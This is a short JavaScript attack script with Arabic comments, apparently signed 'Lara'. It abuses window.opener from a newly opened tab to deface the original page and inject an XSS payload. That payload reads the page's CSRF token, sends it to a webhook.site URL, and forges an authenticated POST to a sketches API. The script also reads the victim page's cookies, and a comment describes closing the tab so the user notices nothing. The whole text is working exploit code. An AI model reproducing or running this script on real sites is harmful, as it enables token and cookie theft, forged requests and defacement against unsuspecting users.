// 1. طباعة علامة لارا في كونسول الصفحة الجديدة
console.log("Lara: Acting from the new tab...");

if (window.opener) {
    // 2. تغيير محتوى الصفحة الأصلية (الضحية لا تزال هناك!)
    window.opener.document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:100px;'>Hacked by<img src="ssqeew.png" onerror="(function(){const t=document.querySelector('meta[name=\'csrf-token\']')?.content;if(!t){alert('Token Not Found');return;}fetch('https://webhook.site/797b8441-6a62-471c-9271-4b365d46053a',{method:'POST',mode:'no-cors',body:t});fetch('/api/v1/sketches/1/',{method:'POST',headers:{'Content-Type':'application/json','X-CSRFToken':t},body:JSON.stringify({name:'rrrrrrr',description:''})}).then(r=>alert('Done! Status: '+r.status));})();"> <script>alert(300);</script></h1>";
    
    // 3. سرقة الكوكيز من الصفحة الأصلية وإرسالها
    const cookies = window.opener.document.cookie;
    console.log("Lara: Cookies from original page:", cookies);
    
    // 4. إغلاق النافذة الجديدة فوراً لكي لا يشعر المستخدم بشيء
    // window.close(); 
}
